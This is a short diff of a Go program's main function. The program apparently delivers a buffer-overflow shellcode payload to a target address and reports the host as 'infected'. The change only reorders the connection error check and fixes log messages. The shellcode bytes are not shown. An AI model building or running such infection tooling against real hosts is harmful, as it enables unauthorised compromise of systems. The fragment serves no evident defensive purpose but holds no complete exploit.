@@ -392,20 +392,18 @@ func main() {
 		log.Printf("%s infected.\nResponse:\n%s", *addr, string(b))
 	case *useBufferOverflow:
 		conn, err := net.Dial("tcp4", *addr)
+		if err != nil {
+			log.Fatalf("Failed to connect to %s: %s", *addr, err)
+		}
 		defer conn.Close()
 
-		log.Printf("Sending payload to %s...", *addr)
-
-		if err != nil {
-			log.Fatalf("Failed to dial %s: %s", *addr, err)
-		}
-
+		log.Printf("Sending shellcode to %s...", *addr)
 		_, err = conn.Write(ShellCode)
 		if err != nil {
 			log.Fatalf("Failed to send buffer overflow shellcode to %s: %s", *addr, err)
 		}
 
-		log.Printf("Payload send. Infection may take a while...")
+		log.Printf("Payload sent. Infection may take a while...")
 	default:
 		l, err := net.Listen("tcp4", *tcp)
 		if err != nil {
